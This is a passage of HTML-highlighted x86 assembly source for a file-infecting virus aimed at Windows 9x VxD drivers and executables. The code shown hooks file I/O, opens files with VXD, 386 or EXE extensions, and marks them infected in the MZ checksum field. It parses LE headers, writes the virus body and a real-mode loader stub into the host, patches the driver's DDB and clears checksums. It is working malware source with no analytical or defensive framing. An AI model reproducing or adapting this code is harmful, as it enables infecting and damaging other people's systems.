</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;File extension</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DXV'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Extension_OK</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'683'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Extension_OK</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Infection_Done</span><span class="sc0">
</span><span class="sc5">Extension_OK</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Read/write</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Open file if it exists</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Original_FileIO</span><span class="sc0"> </span><span class="sc1">;Open the file (read/write mode)</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Infection_Done</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_File</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Simulate_FileIO</span><span class="sc0"> </span><span class="sc1">;Close the file</span><span class="sc0">
</span><span class="sc5">Infection_Done</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Disable_Hook</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc5">File_Hook_Exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">LeaveProc</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Old_File</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">File_Hook</span><span class="sc4">,</span><span class="sc5">KEEPFRAMEVARS</span><span class="sc0">

</span><span class="sc1">;Routines</span><span class="sc0">

</span><span class="sc1">;Infect file</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  File_Handle=Handle of file to infect</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,EBX,ECX,EDX,ESI=?</span><span class="sc0">
</span><span class="sc1">;  Update all data</span><span class="sc0">
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Init data</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Header</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Read_LE</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Update_DDB</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Clear_Checksums</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Fix_Real_Mode</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">Loader_Size</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Loader_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read real-mode code</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Simulate_FileIO</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Virus_Physical_Size</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Start</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write virus body</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write real-mode stub</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_File</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write DDB</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Header</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">No_LE_Write</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Header_File</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write LE header</span><span class="sc0">
</span><span class="sc5">No_LE_Write</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Write_LE_Info</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Dealloc_Exit</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_File</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Write LE info</span><span class="sc0">
</span><span class="sc5">Dealloc_Exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">No_Dealloc</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">My_HeapFree</span><span class="sc0">
</span><span class="sc5">No_Dealloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Read LE header and info, mark file infected/impossible to infect</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  File_Handle=Handle of file to read/write</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  ESI=File_Buffer</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    File_Buffer filled with LE header</span><span class="sc0">
</span><span class="sc1">;    LE_Header_File=Offset (within file) of LE header</span><span class="sc0">
</span><span class="sc1">;    LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;    LE_Info_File=Offset (within file) of LE info</span><span class="sc0">
</span><span class="sc1">;    LE_Info_Size=Size of LE info</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Read_LE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read MZ header</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_magic</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Read_LE_Fail</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfarlc</span><span class="sc4">],</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Read_LE_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">HB_Sign</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_csum</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Read_LE_Fail</span><span class="sc0"> </span><span class="sc1">;File already infected/impossible to infect</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">MZ_csum</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Write</span><span class="sc0"> </span><span class="sc1">;Mark file infected/impossible to infect</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Read_LE_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Header_File</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read LE header</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_File</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check_Valid_LE</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Read_LE_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_datapage</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">My_HeapAllocate</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Read_LE_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Mem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_Size</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_Info_File</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read LE info</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Read_LE_Fail</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Check for a valid LE header</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=?</span><span class="sc0">
</span><span class="sc1">;  ECX=0</span><span class="sc0">
</span><span class="sc1">;  * Zero flag set: Valid LE</span><span class="sc0">
</span><span class="sc1">;  * Zero flag clear: Invalid LE</span><span class="sc0">
</span><span class="sc5">Check_Valid_LE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_magic</span><span class="sc4">],(</span><span class="sc5">IMAGE_VXD_LEWO</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)\
+(</span><span class="sc5">IMAGE_VXD_LEBO</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_SIGNATURE</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_level</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_cpu</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">IMAGE_VXD_OS_DEV386</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_CPU_386</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">IMAGE_VXD_OS_DEV386</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_CPU_586</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_mflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_VXD_MODVDEV</span><span class="sc4">+</span><span class="sc5">IMAGE_VXD_NOEXTFIX</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Min_Page_Size</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Max_Page_Size</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_itermap</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_rsrccnt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_dircnt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_impmodcnt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;jne Exit_LE_Check</span><span class="sc0">
</span><span class="sc5">Exit_LE_Check</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Read and update DDB related data</span><span class="sc0">
</span><span class="sc1">;þ On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  File_Handle=Handle of file to read</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;þ On exit:</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    DDB_Offset_Obj=Offset of the DDB_Reserved1 field (in first object)</span><span class="sc0">
</span><span class="sc1">;    DDB_Offset_File=Offset (within file) of DDB</span><span class="sc0">
</span><span class="sc1">;    DDB_Buffer filled with updated DDB</span><span class="sc0">
</span><span class="sc1">;    LE info updated (if necessary)</span><span class="sc0">
</span><span class="sc1">;    Set the Write_LE_Info flag if LE info modified</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Update_DDB</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_Object_Table</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_flags</span><span class="sc4">],</span><span class="sc5">IMAGE_OBJ_READ</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_EXEC\
</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_PRELOAD</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_BIGDEF</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Update_DDB_Fail</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_enttab</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Recalc</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.EB_type</span><span class="sc4">],((</span><span class="sc5">IMAGE_ENT_EXPORT</span><span class="sc4">+</span><span class="sc5">IMAGE_ENT_SHARED</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)\
